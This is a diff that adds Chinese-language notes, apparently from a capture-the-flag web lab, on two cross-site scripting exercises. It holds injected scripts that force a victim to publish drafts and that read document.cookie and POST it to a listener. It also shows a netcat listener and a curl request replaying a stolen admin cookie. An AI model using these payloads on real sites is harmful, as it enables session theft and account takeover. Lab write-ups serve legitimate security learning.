@@ -126,3 +126,57 @@ fetch
 
 此时增加的window.location.href
     --是因为原服务器代码在跳转到publish页面时，会自动提交所有的草稿，所以需要在跳转到publish页面时，将草稿提交。
+
+
+-XSS 6
+            <script>
+            fetch('/draft')
+                .then(response =>response.text())
+                .then(data => {
+                fetch('/publish',
+                {method: 'POST',
+                body: 'data=' + encodeURIComponent(data)})
+                })
+                .catch(error => console.error('Error:',error));
+                </script>
+            --此时的fetch('/publish')是一个POST请求，所以需要增加method: 'POST'，并且需要增加body: 'data=' + encodeURIComponent(data)来传递数据
+            --encodeURIComponent() 函数可把字符串作为 URI 组件进行编码
+            --此时的fetch('/draft')是一个GET请求，所以不需要增加method: 'GET'，也不需要增加body: 'data=' + encodeURIComponent(data)来传递数据
+            --采用两个fetch()方法，第一个fetch()方法用于获取草稿，第二个fetch()方法用于提交草稿
+            --POST 强制要求具有 body 属性，GET 不需要，并且需要声明method: 'POST'，GET不需要声明method: 'GET'
+
+-XXS 7
+        <script>
+        var cookies = document.cookie;
+        fetch('http://challenge.localhost:8080', {
+            method: 'POST',
+            headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: 'cookies=' + encodeURIComponent(cookies)
+        });
+        </script>
+        --此时虽然确实可以监听到cookie，但是由于管理员程序并不会进入这个端口所有需要更改
+
+
+        <script>
+        var cookies = document.cookie;
+        fetch('http://challenge.localhost:8080/login', {
+            method: 'POST',
+            headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: 'cookies=' + encodeURIComponent(cookies)
+        });
+        </script>
+        --改为login端口，这样就可以监听到cookie了
+        --通过观察victim发现会有
+            --127.0.0.1 - - [02/Feb/2025 20:42:13] "GET /favicon.ico HTTP/1.1" 404 -
+            127.0.0.1 - - [02/Feb/2025 20:42:13] "POST /login HTTP/1.1" 302 -
+            127.0.0.1 - - [02/Feb/2025 20:42:13] "GET / HTTP/1.1" 200 -
+        --有login的操作，所以可以通过这个来监听cookie
+        并且启用 nc -lv localhost 8080 来监听cookie
+
+        得到cookie后可以通过
+        curl -b "auth=%3Dadmin%7C6F.dJDO1YDL5UTNxczW%7D" http://challenge.localhost/
+            --得到了flag
